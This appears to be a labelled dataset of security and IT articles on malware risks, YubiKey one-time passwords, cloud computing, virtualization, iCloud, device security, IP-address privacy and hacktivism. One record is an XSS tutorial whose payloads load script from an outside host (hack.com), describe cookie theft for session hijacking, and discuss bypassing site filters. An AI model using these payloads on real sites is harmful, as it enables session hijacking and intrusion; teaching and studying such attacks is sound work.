by malicious software\nComputer viruses, hackers, and other Internet dangers continue to pose a high risk.\nA range of malicious programs (viruses, worms, Trojans, etc.) are designed to damage\ncomputers or obtain confidential information from them. These infections can wreak\nhavoc by causing permanent computer damage, destroying data, and enabling identity\n- Reduction in processing. Infections can cripple a system and bring processing\nto a halt. Viruses can make dangerous changes to the vital registry, causing system\nslowdowns and crashes.\n- Lost files. Your files – treasured photos, valuable music, important financial\nrecords – can all be destroyed if your computer becomes infected.\n- System and file damage. Viruses are designed to alter the operation of\na computer. In addition to damaging files, viruses can harm your registry, your\noperating system, and even your hardware.\n- Data and identity theft. Trojans can enable the theft of any data saved\non your computer, including banking and credit card information, passwords, address\nbooks, and other private information.\n- Financial risk. The monetary cost of recovering from data loss or identity\ntheft can be devastating.\n- Spreading of infections to others. You can unknowingly spread viral infections\nto your friends, family, and business associates just by sending an email or leaving\nyour computer unattended. Hackers can secretly take control of your PC and use it\nto attack and infect other computers.\n- Use a firewall. A firewall is vital to secure Internet activity. A firewall\nputs up a barrier against hackers and other intruders, but allows the Internet access\nthat you do want. Configure the firewall so that only the programs and Web sites\nyou trust are allowed to pass through.\n- Use antivirus software. Antivirus software is a must-have for anyone who\nuses the Internet. This software blocks computer infections and detects and removes\nany existing infections. Make sure you keep the virus signatures up to date for\n- Patch known security flaws. Many malicious programs exploit known security\nvulnerabilities in operating systems and browsers. Install the latest security patches,\nor use a specialized program that can automatically repair these flaws.\n- Only download trusted programs. Only download programs from trusted Web\nsites or refer to a trusted source for information. Do not install software if you\nare not sure about it.\n- Back up important files, including the registry. Establish and follow a\nschedule for regular backups of your data. Ideally, use a backup program that backs\nup all files, including programs and hidden operating system files. Regular backups\nof the registry are also recommended to protect its critical settings.\n- Permanently erase deleted confidential data. A file deleted through Windows\nis not completely erased; even though you can't see the file, someone using easily\navailable tools can recover it and view its contents. For highly confidential data\nyou have deleted, use data wiping software that completely erases all data remnants.\nRisks posed by corrupted settings\nOver time and with regular usage, a computer can slowly degrade and become unstable,\nwith frequent crashes, perplexing error messages, and a host of other unexpected\nnuisances. Some defects that can crop up over time are invalid registry references,\nbroken shortcuts, hidden spyware, obsolete uninstallation files, and physical errors\non the hard drive and other devices.\n- Reduction in processing. Unneeded uninstallers and other invalid data in\nthe registry overburden Windows processing. Spyware wastes system memory and can\nslow or stop Internet processing and lead to overall sluggish performance.\n- Recurrent crashes and lock-ups. Damaged hard drives, spyware parasites,\nobsolete shortcuts, and inaccurate registry references frequently cause computer\ncrashes and lock-ups. A volatile computer is extremely frustrating and can become\n- Exposure to infections. In addition to burdening system memory, spyware\nhas been used to deliver Trojans and viruses. Any program designed to install on\na computer without the user’s knowledge carries a potential security risk.\n- System and file damage. Damaged sectors on a drive can prevent files from\nbeing accessed or saved and can cause system crashes. Spyware often incorporates\npoorly or carelessly designed functions that can harm your computer’s operating\nsystem and cause conflicts with your valid software.\n- Use spyware removal software. Spyware is created with covert techniques\nthat make it difficult for people to spot. The safest approach is to use software\nthat scans for and deletes spyware. Note: Do your research when dealing with unknown\nvendors. Some spyware removers advertised as “free” are actually spyware themselves,\nor contain Trojans and viruses.\n- Repair hard drive errors. A damaged hard drive can prevent you from saving\nfiles and retrieving existing files. Using software to fix hard drive errors protects\nyour data and improves PC stability.\n- Repair registry errors. The registry is vital to your computer's ability\nto run correctly and when it becomes corrupted, overall degraded performance occurs.\nMost technical advisors recommend that specialized software be used to make registry\nchanges, rather than making manual changes.\n- Be cautious of so-called “free” programs. Free programs, such as file-sharing\nsoftware, screen savers, and games, are regularly bundled with spyware. Disclosure\nof spyware is often hidden in the fine print of a license agreement. Be sure you\nunderstand what is packaged with a program before you download it.\nAdware is software that generates advertisements, usually as banner ads or pop-up\nwindows. Adware is usually bundled with other software and installed without your\nknowledge. While usually not physically damaging or outright malicious, the intrusive\nbehavior of adware can be annoying and waste system resources.\nCache files are used to store information on a temporary basis for quick access.\nA common example of a cache file is a browser cache. Every time you open a Web page,\nyour browser creates a cache file (a temporary copy) of the page's text and graphics.\nWhen you open the page again, your browser checks the Web site server for changes.\nIf the page hasn't changed, your browser loads the page from cache on your hard\ndrive, which is much faster than originally loading it from the remote server.\nA cookie is a small text file that some Web sites save to your local, hard drive\nwhile you are browsing the site. Cookies contain identifying information, such as\nlog in and shopping cart information. Cookies are useful for loading Web site preferences\nand login settings, but they can also contain information that can be passed to\nothers without your knowledge, usually for advertising purposes.\nOver time, as you create, delete, and download files, your computer cannot store\ndata as one unit and instead will split it up and store pieces in various drive\nlocations. A fragmented hard drive has a large amount of such scattered data and\ncan significantly slow PC performance. Similar to hard drives and other storage\nmedia, system memory can also become fragmented with time and usage.\nDefragmenting reorganizes data so that components are stored closer to each\nother. Regularly defragmenting hard drives and system memory improves drive speed,\nreclaims valuable memory, and extends the life of your computer.\nMalware (MALicious softWARE) is a generic term covering a range of software programs\nthat are designed to damage computers or to obtain unauthorized information from\ncomputers. Some specific types of malware include viruses, worms, and Trojans.\nThe registry is a database that holds configuration settings used by your Windows\noperating system. The registry is vital to your computer’s ability to run correctly.\nIt stores key data that Windows requires and continually references, such as user\nprofiles and settings for installed software and hardware.\nOnly manually edit the registry if you know what you are doing; making inaccurate\nmodifications can severely damage your computer. Always back up the registry prior\nto making any changes.\nSpyware is tracking software that is installed on your computer without your notice\nor consent. It sends information about your computing activities back to its source,\nusually for advertising purposes, but sometimes for much more dangerous purposes\nsuch as identity theft or credit card fraud.\nThe effect of spyware varies depending on what its creator’s intentions are and\ncan include consumption of valuable system resources, random lockups, crashes, or\nslowdowns; Web browser Home page or search page redirection; unwanted software installation;\nand random or incessant pop-up ads.\nA Trojan, or Trojan horse, is a software program that appears to be desirable or\nuseful, but intentionally does something you do not expect. The effects of Trojans\ncan range from simply displaying pop-up ads to destroying files or enabling the\ntheft of data.\nTrojans are distributed in executable files, such as through email attachments,\nCDs, and Internet downloads. People can be lured into installing a Trojan because\nit appears that it will serve a legitimate purpose. Unlike viruses and worms, a\nTrojan is not designed to make automatic copies of itself. However, Trojans can\ncarry viruses and other malicious software within them.\nTwo specific types of Trojans are keyloggers and RATs:\n- A keylogger, or keystroke logger, captures all keystrokes and then records that\ninformation to a log file. With a keylogger, a hacker can capture your logins, passwords,\ncredit card numbers, and any other confidential information that you type. Once\ncollected, this information can be silently transmitted to the Trojan’s creator\nfor malicious purposes, such as credit card or bank fraud.\n- A remote access Trojan (RAT) gives someone remote access to and control of a computer.\nWith a RAT, imposters can send email messages that will appear to be from you; read,\nmodify, or destroy your documents; and use your PC to attack and infect other computers.\nA computer virus is a software program designed to alter the operation of a computer.\nMost viruses are malicious and intended to cause damage, but even a benign virus\ncan harm a system. Viruses can damage files, software programs, the registry, and\nViruses are distributed in executable files, such as through email attachments,\nCDs, and Internet downloads. A virus infection occurs when the infected file is\nrun. A virus also automatically replicates, or makes copies of itself, by secretly\nembedding its programming code into other programs.\nThe term “virus” is often used as a generic, collective reference that includes\nother types of malicious programs, such as worms and Trojans.\nA computer worm is a software program designed to reproduce and spread among computers.\nMost worms are malicious and intended to overwhelm system memory or network bandwidth.\nWorms can crash an entire network of computers or an individual computer.\nWorms are generally distributed in email attachments or through unprotected Internet\nactivity. A worm spreads very rapidly because it is self-contained. It replicates\nitself and, unlike viruses, a worm does not need to infect another program to spread.", "label": 1}
{"text": "There are some explanations on what YubiKey does here. Basically, the password which the YubiKey \"types\" (from the point of view of the computer, it is a keyboard) can be either a static password, or a one-time password. If it is a static password, then you just revealed it, and it is time to be very sorry (and promptly change that password).\nThe one-time passwords, what YubiKey produces follows HOTP. The cryptography in HOTP is such that it is not computationally feasible to recompute the \"master secret\" from one or several one-time passwords produced with HOTP. Moreover, each password is internally computed from a counter. The YubiKey and the server both maintain the same counter, and the server allows for some limited lack of synchronization. Namely, when the server's current counter has value n and receives a password as authentication attempt, it will internally generate the passwords for values n+1, n+2,... up to, say, n+100 (that's configurable). If a match is found with (say) password n+17, then access is granted and the server's counter is set to n+17; otherwise, connection is rejected and the server's counter is not changed.\nTherefore, what you inadvertently published \"on the Internet\" is a password which will grant access to the corresponding server, until your own next authentication on that server, because that authentication will update the server's counter to a further counter value. In a way, using OTP with counter value k invalidates all OTP values with values j < k. Which leads to the following recovery procedure: if you published an OTP value, quickly connect to the server so as to invalidate that published value. Afterwards, you can just ignore it; once invalidated, it is harmless.\n(Note: if you repeatedly generate a lot of \"blank\" passwords with your key without authenticating to the server, your YubiKey may go out of synch with that of the server -- the key using counter values way beyond what the server would currently accept. Don't let your 3-year-old play with your YubiKey ! In a similar situation, for infrared car keys, counter synchronization is forced through RFID when you start the engine.)", "label": 1}
{"text": "The cloud computing revolution is real: it’s on the front page of the Australian Financial Review this morning. But is it really “a radical new business model that purports to slash technology costs by up to 80%”?\nWhat is cloud computing?\nEvery business bigger than one person needs somewhere to store its data and run its business applications and communications, including email. A generation of businesses has installed a server — or many servers in a data centre — and hired specialist IT staff to run it.\nWith cloud computing, you instead rent capacity in a provider’s data centre, and connect over the internet. The provider’s staff install, maintain and upgrade hardware and software as required. Typically you’ll rent a service, such as data storage or email or accounting, rather than ‘a server’ as such, and pay $X per user or $Y per business per month.\nWhy is it called cloud computing?\nNetwork diagrams have traditionally used a cloud symbol to denote ‘the internet’ or, before that, the telephone network outside the customer’s zone of responsibility.\nWhat services are on offer?\nYou name it. Google’s Gmail and Microsoft’s Windows Hotmail are email in the cloud. In the lucrative business productivity market, Google Docs and Google Apps compete directly with Microsoft Office and Exchange — the latter now ‘in the cloud’ as Microsoft Online Services.\nAccounting, customer relationship management (CRM), project management, email marketing, spam and virus filtering, data storage, ecommerce, online publishing, audio and video streaming, general databases — all available in the cloud.\nWhy use cloud computing?\nPotentially cloud services are cheaper and more flexible. Because they’re internet-based, you can access them from anywhere — often including mobile devices.\nMost servers and internet links lie idle most of the time. Cloud providers host many businesses on a pool of hardware, sharing the cost of servers, electricity, data links, backup systems, IT staff and even real estate. A cloud provider can quickly add extra capacity or scale it back again when you need it. Capital expenditure on servers and up-front software licenses, and the unpredictable costs of dealing with emergencies, are replaced by a predictable operational cost.\nCan it really cut IT costs by 80%?\nThat’s hype. Hardware and internet costs are dropping, sure, but supporting end users is still a significant cost. Moving to the cloud removes the cost of maintaining your own systems, but you still need to configure the generic cloud-based service to match your business’ unique needs, train your staff and help them find lost spreadsheets.\nIs there a downside?\nYou become dependent on your cloud providers. If there’s no easy way to extract your data in a usable format, your business success is now intertwined with theirs. There may also be legal and privacy issues: will your data become subject to the privacy and data retention laws of another country; will you still be compliant with your industry requirements in Australia?\nIs it secure?\nBig cloud providers like Microsoft and Google have some of the best security staff on the planet. Their backup procedures are likely to be better than yours too. (Where are your business data backups right now?) However big cloud providers do represent an attractive target to hackers — if they can break in.\nIs cloud computing “radically new”?\nNot everyone thinks it’s that big a change. It’s more evolution than revolution. “Cloud computing is not only the future of computing, it is the present, and the entire past of computing is all cloud,” said Larry Ellison, founder of Oracle Corporation and the world’s sixth richest man, in a passionately entertaining rant last year. “It’s not water vapour. All it is is a computer attached to a network. What are you talking about? I mean, what do you think Google runs on?” As Ellison points out, CRM provider Salesforce.com has been running more than a decade.\nIn many ways cloud computing is indeed just the current buzzword for what has also been called utility computing, grid computing, software as a service (SaaS), IBM’s ‘On Demand’ branded services, the application service provider (ASP) model, or even good ol’ mainframe timesharing.\nWhere is Australia in all this?\nSome big companies have committed to cloud computing, including the Commonwealth Bank, Westpac, Visy and Komatsu. The Royal Australian College of General Practice will provide GPs with cloud-based e-health applications by this time next year. Even the Department of Defence’s CIO is advocating the cloud.\nOn the supply side, Telstra is investing heavily to become a player — they’re providing the RACGP’s services. Saasu and Campaign Monitor are Australian success stories in cloud-based accounting and email marketing respectively.\nCloud computing does require solid internet links, however. Australia’s relatively expensive broadband infrastructure may have held back adoption. The NBN will presumably fix this.", "label": 1}
{"text": "Virtualization, in computer science, is a virtual (or real) of something, such as hardware platform, operating system, storage device or network resources.\nVirtualization can be seen as part of the largely expansion of enterprise IT that includes autonomic computing, a scenario in which the IT environment can be managed on the basis of perceived activity, and utility computing, where you see the processing power of computers utility customers to pay only when necessary. The usual goal of virtualization is to centralize administrative tasks and improve the scalability and workload.\nVirtualization within IT is not a new phenomenon; in fact, it has been a way to reduce IT costs in the industry in one form or another for nearly 20 years. The main difference now is the wide range of virtualization technologies available and how these can be implemented to achieve differing business objectives.\nBecause virtualization can introduce flexibility to an IT estate and bring with it a wide range of benefits, IT organizations often lose focus on the benefits they are looking for and concentrate on delivering to those needs. No single item in an IT budget is going to have the procurement impact of the mainframe of yesteryear, and as such, far more work needs to be done to quantify the benefits\nVirtualization can increase the capacity of the data centre, reduce hardware support costs, bring electricity bills within digestible limits and even increase performance by removing aged architecture from your estate.\nThe creation and popularity of mobile devices in the market today has seen IT departments having to respond to user requests to connect everything from smart phones to tablets to their corporate environments.\nIt is easy for the users to use the application, but difficult to choose.\nVirtualization is further divided as desktop virtualization and server virtualization.\nServer virtualization is the partitioning of a physical server into smaller virtual servers. In server virtualization the resources of the server itself are hidden, or masked, from users, and software is used to divide the physical server into multiple virtual environments, called virtual or private servers.\nServer virtualization has many benefits. For example, it lets each virtual server run its own operating system and each virtual server can also be autonomously, separately rebooted of one another. Server virtualization also reduces costs because less hardware is required so that alone saves business money. It also utilizes resources to the fullest so it can also save on operational costs (e.g. using a lower number of physical servers reduces hardware maintenance).\nDesktop virtualization – Many enterprise-level implementations of technology store the resultant “virtualized” desktop on a remote central server, instead of on the local storage of a remote client; thus, when users work from their local machine, all of the programs, applications, processes, and data used are kept on the server and run centrally. Desktop virtualization allows users to run operating system and execute applications from a Smartphone or a thin client which exceed the user hardware’s capability to run.Pin It", "label": 1}
{"text": "About Incorporating iCloud Into Your App\niCloud is a free service that lets users access their personal content on all their devices—wirelessly and automatically via Apple ID. iCloud does this by combining network-based storage with dedicated APIs, supported by full integration with the operating system. Apple provides server infrastructure, backup, and user accounts, so you can focus on building great iCloud-enabled apps.\nThe core idea behind iCloud is to eliminate explicit synchronization between devices. A user never needs to think about syncing and your app never interacts directly with iCloud servers. When you adopt iCloud storage APIs as described in this document, changes appear automatically on all the devices attached to an iCloud account. Your users get safe, consistent, and transparent access to their personal content everywhere.\nAt a Glance\niCloud is all about content, so your integration effort focuses on the model layer of your app. Because instances of your app running on a user’s other devices can change the local app instance’s data model, you design your app to handle such changes. You might also need to modify the user interface for presenting iCloud-based files and information.\nThere is one important case for which Cocoa adopts iCloud for you. A document-based app for OS X v10.8 or later requires very little iCloud adoption work, thanks to the capabilities of the\nThere are many different ways you can use iCloud storage, and a variety of technologies available to access it. This document introduces all the iCloud storage APIs and offers guidance in how to design your app in the context of iCloud.\niCloud Supports User Workflows\nAdopting iCloud in your app lets your users begin a workflow on one device and finish it on another.\nSay you provide a podcast app. A commuter subscribes to a podcast on his iPhone and listens to the first twenty minutes on his way to work. At the office, he launches your app on his iPad. The episode automatically downloads and the play head advances to the point he was listening to.\nOr say you provide a drawing app for iOS and OS X. In the morning, an architect creates some sketches on her iPad while visiting a client. On returning to her studio, she launches your app on her iMac. All the new sketches are already there, waiting to be opened and worked on.\nTo store state information for the podcast app in iCloud, you’d use iCloud key-value storage. To store the architectural drawings in iCloud, you’d use iCloud document storage.\nThree Kinds of iCloud Storage\niCloud supports three kinds of storage. To pick the right one (or combination) for your app, make sure you understand the intent and capabilities of each. The three kinds of iCloud storage are:\nKey-value storage for discrete values, such as preferences, settings, and simple app state.\nDocument storage for user-visible file-based information such as word processing documents, drawings, and complex app state.\nCore Data storage for shoebox-style apps and server-based, multi-device database solutions for structured content. iCloud Core Data storage is built on document storage and employs the same iCloud APIs.\nPrepare for iCloud with Provisioning and Entitlements\nThe first two steps in adopting iCloud for your app are to obtain an appropriate provisioning profile for your development device and to request the appropriate entitlements in your Xcode project.\nEntitlements are key-value pairs that request capabilities for your app—such as the capability to use iCloud. Your iCloud entitlement values define where your app can place data and they ensure that only your apps are allowed to access that data. You request separate entitlements for document storage and key-value storage. When you code sign your app, these requests become part of your app’s code signature.\nHow to Use This Document\nWhether you are developing for iOS, OS X, or both, and no matter which sort of app you are developing, start by reading the entire “iCloud Fundamentals” chapter to get the foundation that all iCloud developers need.\nNext, read “Designing for Key-Value Data in iCloud.” Any app that provides user settings or maintains user state—that is, nearly every app—should adopt iCloud key-value storage.\nThe iOS and OS X document architectures automatically provide most of the iCloud functionality needed by document-based apps. If your app works with file-based information, you’ll want to read “Designing for Documents in iCloud.”\nIf you are developing a Core Data app, read “Designing for Core Data in iCloud” for an overview of iCloud considerations for Core Data.\nNo matter which iCloud storage APIs you adopt in your app, testing is critical. To get started on creating a test plan for your app, read “Testing and Debugging Your iCloud App.”\nThis document describes the pieces you need to support iCloud in your app, but does not teach you how to develop apps. For that, start with Start Developing iOS Apps Today or Start Developing Mac Apps Today, and read the following documents:\niOS apps: iOS App Programming Guide\nMac apps: Mac App Programming Guide\nFor a tutorial introduction to implementing a document-based iCloud app for iOS, read Your Third iOS App: iCloud.\n© 2012 Apple Inc. All Rights Reserved. (Last updated: 2012-09-19)", "label": 1}
{"text": "As we continue this journey into the age of big data, cloud, mobility, social media and so forth, vast amounts of data are being generated daily. The volume of digital information continues to grow with no end in sight. More and more, personal and company information are becoming more and more digitized, both in storage and transfer. Securing this information is a growing challenge, and is becoming more complex by the day. Protecting digital assets means utilizing the best of available technologies and methodologies to achieve security goals. Not only must they ensure that the quality and performance of the solution is maintained, they must also assure undoubtedly that the information they seek to protect stays uncompromised.\nIn the worlds of business and government, troves of information exist that are the focus of network security protection. Among the many different types, the data in question could be financial, medical, legal information, business intellectual property, and customer information. The vulnerability points could be numerous, and present points of weakness that emanate from such common elements such as a wi-fi network, dial-up, DMZ, Web Servers, VPN, USB drives – just to name a few. Organizations must therefore ensure they are monitoring all parts of their networks, and ensure they are using the best of security solutions that are deployed properly. Among the many things to consider are abilities such as administrator notification in the event of a breach and any related actions thereafter.\nNetwork monitoring manifests itself as a sustained operation, examining components of the network for information, failure, or performance. In the event of a failure, a notification is commonly configured. Depending on the environment this could range from alerting a system administrator, to logging an event in a knowledge base. Knowledge can be gleaned from a robust and well-integrated system by constantly analyzing performance, server outages, and any behavior that is out of the norm and varies from a baseline.\nSecuring a network focuses on the effects of external threats to the network. Many organizations are under the direct influence of regulatory concerns; many others are targeted for attack by criminal and nefarious parties. Still other organizations may hold and protect valuable consumer and client data. A breach of such information could be significantly damaging to the reputation of an organization. The argument for proper and effective security cannot be dismissed in case after case, after case.\nThere was a time when sophisticated network protection may have been an afterthought. Those days are long behind us. Take for example consumer focused services, copious amounts of information are increasingly put into cloud constructs, mobile technologies, across foreign networks, and many other elements that help complicate this picture. Customers expect their information is safe, secure, and free from prying eyes. Well publicized stories about identity theft, banking scams, and privacy have brought awareness to the general public. Though a brief example, when the concept is extended into confidential company information, or financial information, it is quite easy to extend the business-critical nature of network security into countless scenarios.\nA well-constructed network security system that is efficient in technical operation and accepted as a necessary policy are critical in today’s network and computing services. If you have not raised the criticality of security in your organization on par with other services your organization provides, then your organization could possibly face being quite behind in providing the best service possible and be on the wrong side of the risk. Accepting yesterday’s acceptable security in the ever-changing world of technology is a recipe for failure.", "label": 1}
{"text": "There are several good ways to physically protect the data on laptops, netbooks, smart phones, personal data assistants (PDAs), memory sticks and other portable devices. Because these devices are small and generally not secured, it makes them especially susceptible to theft. Even if the data is protected and/or encrypted, theft of a portable device is nonetheless inconvenient and frustrating. In a worst-case scenario, the exposure of private and sensitive data could lead to serious consequences for a CPA firm.\nPortable devices with wireless capabilities are vulnerable to a wide range of potential attacks. Many devices are stronger than others when it comes to security. For example, Research in Motion (RIM), the company behind the BlackBerry, has made significant strides when it comes to smart phones and PDAs.\nSecuring portable devices combines many different techniques. For example, you probably have one or more passwords that need to be entered before accessing data. Be smart and keep these in mind when using and creating passwords:\n- The Obvious — Create a strong password that you can easily remember and protect it from prying eyes.\n- Length and Complexity — Use at least 14 characters. The greater the variety of characters in your password, the better. Use the entire keyboard, not just the letters and characters you use or see most often.\n- Avoid — Dictionary words in any language; words spelled backwards, common misspellings and abbreviations; sequences or repeated characters; using personal information.\n- Test Your Password — Try www.microsoft.com/protect/fraud/passwords/checker.aspx. Microsoft offers some good guidance on creating strong passwords.\nStore Data in Different Places\nDon’t put all of your eggs in one basket. Never, ever allow your portable device to be the sole storage location of confidential or sensitive data. Consider storing data in separate locations. There are a number of storage mediums available that can be used for this purpose. External storage devices, like network area storage (NAS) boxes, are ideal. A reasonably sized NAS box can be purchased for under $200. In addition to storing data in different places, a NAS box works extremely well for frequent and timed backups of portable devices. This helps to guarantee availability of data if the portable device is lost or stolen.\nEncrypt Your Files\nEncryption helps ensure that unauthorized parties cannot access confidential and sensitive data, even if they have physical access to the portable device. Full disk encryption on laptops and netbooks is a must when such machines are used on engagements and may contain confidential and private client data. This technology prevents an intruder from starting a portable device without a password or biometric swipe.\nLaptops, netbooks and PDAs should receive the same level of security as your office desktop computer. Viruses are very common on the Internet and could potentially cause significant damage if your device is not protected. Take the protection one step further by implementing a solution that defends against other threats, such as malware.\nA firewall is an essential component in portable data protection. This mechanism monitors inbound and outbound traffic and also offers protection when you’re traveling. When using your laptop or netbook in a public space, you will frequently encounter various available networks. While some of them will enable you to securely access the Internet, others will appear to allow Internet access but covertly capture activity that may be passed through the connection. A firewall will help to detect the intrusion and automatically block these efforts.\nAsk yourself, “Is it really necessary that I transport this sensitive information?” If the answer is no, then don’t put the sensitive information on the portable device. In addition to the aforementioned measures, deploying and training your staff on portable-device-security best practices will also help protect confidential and private data.\nUnderstand how your portable device works. Read all of the instructions. New portable devices have more features, which means that you will have more of a learning curve to be able to understand and use these items properly. Default settings are often the least secure for devices as everyone with that same device will have the identical default settings.\nKeep Up With Patches\nIf the device is a laptop, netbook or PDA, keep the patches current. Most vendors provide simple notification and update procedures (e.g., Microsoft Windows Update). If the device is a BlackBerry or other device with a proprietary operating system, make sure that the operating system is updated frequently.\nDon’t assume that just because you are deploying new portable devices that they have current patches installed. Often, devices are produced months before they are sold and initial operating systems have since been updated.\nDisable Unused Access Methods\nIf you have a portable device equipped with a wireless card and that card is not being used, turn it off. Lock the portable device when not being used or when the device is being placed somewhere outside of your control.\nWhenever using mobile data, always consider, “What could happen if an unauthorized person gained control of this information?” Look for and try to use the most secure methods for handling data. Vendors are a good source of data. Visit their websites for additional information.\n|Rate this article 5 (excellent) to 1 (poor). Send your responses here\nJames C. Bourke, CPA.CITP, CFF, is a partner at WithumSmith+Brown and also the director of Firm Technology. He is a past president of the New Jersey Society of CPAs and currently serves on AICPA Council and chairs the AICPA CITP Credential Committee. He was recently named one of the Top 100 Most Influential People in the profession.", "label": 1}
{"text": "Hello friends. These days I am on an XSS rampage. I recently posted an article on XSS vulnerability in Babylon search. Since then I got several request from the readers to post a quick article on cross site scriptting. This tutorial will be divided into two parts. In the first part I will cover the basics of XSS and how the attack vector is implemented. In the next tutorial we will discuss some techniques by which we can prevent XSS attacks.\nOWASP lists sql injection and XSS as the two most common vulnerabilities in web pages and web apps. We have covered SQL injection quiet extensively so I decided to write on xss.\nCross Site Scripting or XSS is a web application attack that involves injecting a piece of malicious code into the vulnerable web application/web page. The attacker injects a client side script mainly through the web browser to reach the other users of the particular website. This attack can open several doors for the attacker ranging from session hijacking to entire database compromise.\nReflected or Non-persistent XSS attack\nThis is the most common form of XSS attack in which the attackers crafts a malicious code and transfers it to the server side either through the HTTP request parameter or through some HTML form submission. A simple Reflected XSS attack looks like this-\n<script>alert(‘xss’);</script> (Embedded Script)\n<script src=http://hack.com/xss.js></script> (External script)\nConsider this real time example of reflected XSS in action:\nStored or Persistent XSS attack\nThis attack is more dangerous and complicated compared to reflected XSS attack. In Stored or persistent XSS attack, the vulnerable script is stored on the target server and is activated once another user clicks on it. For example, consider a forum where the attacker posts a message containing a link to malicious script. Another user when views the message and clicks it, then the script activates and causes respective attack.\nThe attacker can craft a malicious script like a cookie stealing script of the form <script>alert(document.cookie);</script> and steal victims cookies to perform session hijacking.\nDOM based XSS attack\nConsider the following piece of code:\nvar loc = document.location + '?gotoHomepage=1';\ndocument.write('<a href=\"' + loc + '\">Home</a>');\nComplete Cheat Sheet on XSS:\nBypassing Xss Simple Filteration Without Alteration:\nNow we notice, the above script we used for filtration is evolving only a few strings, knowing there are bunch of ways and\nstrings to inject a malicious request.\nIt's only filtering '< > /' means leaving hackers with a vast amount of other strings to inject a malicious code.\nThis will generate an alert box again on a vulnerable server.\nThis will too generate an alert box on a vulnerable server.\nBypassing Advance Xss Filtration:\nSome webmasters filter lot more than this, especially it's filtered on important sites like gov and org sites.\nThere's nothing impossible, we will try to get as much info about the filtration as much we can.\nSupposing a server that have filtered all strings just more than common in a way that it reads the malicious string in the beginning or in the end to avoid and abort it, this of course can be bypassed too!\nAn example can be likely so:\nThe above script will bypass filtration for the server that reads the malicious string in the beginning.\nThis will bypass filtration on server that reads whether in the beginning or in the end or at both ends!\nMostly, this kind of filtration isn't common, so cant be of much use.\nSome webmasters also filter the word 'xss' so it's likely to use some other message for making an alert.\nThis will bypass message filtration.\nNow we will study some more advance filtration bypass.\nSome webmasters just simply define a pattern of a cross-site scripting script that is possibly common.\nIn this case, I will mention here the full array of strings to inject, bypassing the filtration.\nWe will suppose injecting in a search form.\nvictim.com/search.php?query=\"><script src='http://malicous js'</script>\nThese are a few simple and advanced scripts that can be used to check for XSS vulnerability. There are several automatic tools available as well but I would recommend that you first learn the manual method so that you can clearly understand the attack vector. Later on you can switch to automatic tools. In case you know any other XSS script that is missing in this tutorial then you can add in the comment box and I will update it in this tutorial along with your name.\nSpecial Thanks : str0ke,USMAN,tushy,Hackman,shubham,Fix", "label": 1}
{"text": "IP addresses, strings of numbers that identify computers on the Internet, should generally be regarded as personal information, the head of the European Union's group of data privacy regulators said Monday.\nPeter Scharr, Germany's data protection commissioner as well as head of the EU data privacy group, told a European Parliament hearing that when an IP, or internet protocol, address identifies an individual user, then it must be considered personal data. Scharr's team has been commissioned to report on Internet search engine providers such as Google, Microsoft, and Yahoo, and examine how their Internet privacy policies stack up against E.U. privacy law.\nCompanies like Google disagree with his conclusion because knowing the IP address of a certain computer doesn't necessarily tell you who is on that computer at any moment. A point Scharr concedes as computers with Internet access at cafés, libraries, and offices are examples of computers with multiple users per IP address.\nHowever, \"WHOIS\" Web sites have popped up where a user can type in an IP address and receive the name of the person or company identified with it.\nThe AP says if IP addresses become privileged personal data, this will have a far-ranging effect on how search engines record data.\nGoogle says it needs to store search queries and gather information on online activity to improve its search results and to provide advertisers with correct billing information that shows that genuine users are clicking on online ads.\nInternet \"click fraud\" can be tracked by showing that the same IP address is jumping repeatedly to the same ad. Advertisers pay for each time a different person views the ad, so dozens of views by the same person can rack up costs without giving the company the publicity it wanted.\nOn the other side of the Atlantic, CRMDaily.com reports that the Federal Trade Commission's verdict on whether IP addresses constitute private, and thus protected, information is still out.", "label": 1}
{"text": "November 26, 2012: March 8, 2011: Hacktivists are non-government organizations, or even individuals, who launch Internet based attacks in the name of a favorite cause. After Hamas declared war on Israel on November 15th, many Western hacktivists declared themselves allies of Hamas and launched attacks on Israel. Like Hamas, the hacktivists promptly began issuing press releases detailing their victories. But, like the Hamas claims, the hacktivist victories were illusions and fabrications. Despite over eight million attacks (nearly all of them automated) a day, the main targets (Israeli media, government, and military sites) were largely unscathed. The Israelis were prepared, because they have been under attack for a long time. Moslem attackers have not been skilled enough to do much, if any damage. While the many recent cyber attacks against Israel were in the name of Hamas and Gaza, few were from Arab countries. Most were from hackers living in the West.\nA major player in this attack was the hacktivist group Anonymous. While Wikileaks has shown some care in not revealing information that would get counter-terror operatives (or informants) killed, a similar operation, Anonymous, has not demonstrated any restraint. For example, in an effort to get other hackers to stop pursuing Wikileaks supporters, the Anonymous crew broke into the network of a firm that did counter-terrorism work (HBGary Federal) and put on the Internet emails revealing how hacking software was used to gain access to terrorist computers and communications. Among the more interesting items revealed was the widespread use of USB thumb drives to gain access to the terrorist computers. Another revelation described how laptop ExpressCard ports could be used as well. The techniques revealed are not rendered completely useless, just less effective. Islamic terror groups tend to attract the less educated and people who don't pay attention as much as they should. But for the sharper terrorists, life just got a little easier and safer.\nThat was a wakeup call for many computer security and counter-intelligence business, demonstrating that the least vulnerability in their own computer security could be exploited by someone with some decent hacker skills.\nFor over a decade Moslem hacktivists have been trying to muster an effective Cyber War capability. So far they have failed. Even before September 11, 2001, there were attempts to build an alliance of anti-U.S., anti-Israel, and anti-India hackers who could pool their efforts to achieve a more significant impact. While there were more attacks against U.S. and Israeli web sites after September 11, 2001, these two nations contained the world's largest concentration (per capita) of Internet talent and were not very vulnerable to attack. Major commercial and government operations in both these nations have also been taking computer security more seriously since September 11, 2001, which has also made it harder for the casual (often an anti-social teenage male) hacker to make much of an impression.\nBut the threat is still there (as detected by monitoring chat rooms, email, and other sources) and is taken seriously. Some groups, however, operate openly (more or less). These groups call themselves hacktivists (activists who use low level hacking to publicize their positions). A decade ago there were three hacktivist groups prominent in backing the Dark Side in the War on Terrorism: USG (Unix Security Guards), an anti-Israel alliance that claimed responsibility for many known attacks against Israeli sites, WFD (World's Fantabulous Defacers), an alliance of 12 Pakistani hacker groups that claimed (or was blamed) responsibility for hundreds of attacks (mainly against Indian sites) between November 2000 and September 11, 2001, and AIC (Anti-India Crew) another Pakistani hacker alliance that also claimed to have made hundreds of attacks against India. Nothing much came of these three groups or the equally boastful successors.\nNote that Pakistan has a long history with software development and hacking. The first computer virus to spread worldwide (the Brain virus), was created in Pakistan by Pakistani programmers. If the Islamic world is going to recruit world class hackers for hacktivism or something more serious, the manpower was likely to come from Pakistan. But that never happened. Anyone in a Moslem country with hacker quality computer skills wants to monetize them, not risk death or life in prison supporting Islamic fanatics. Thus the Islamic terrorists have been dependent on Western 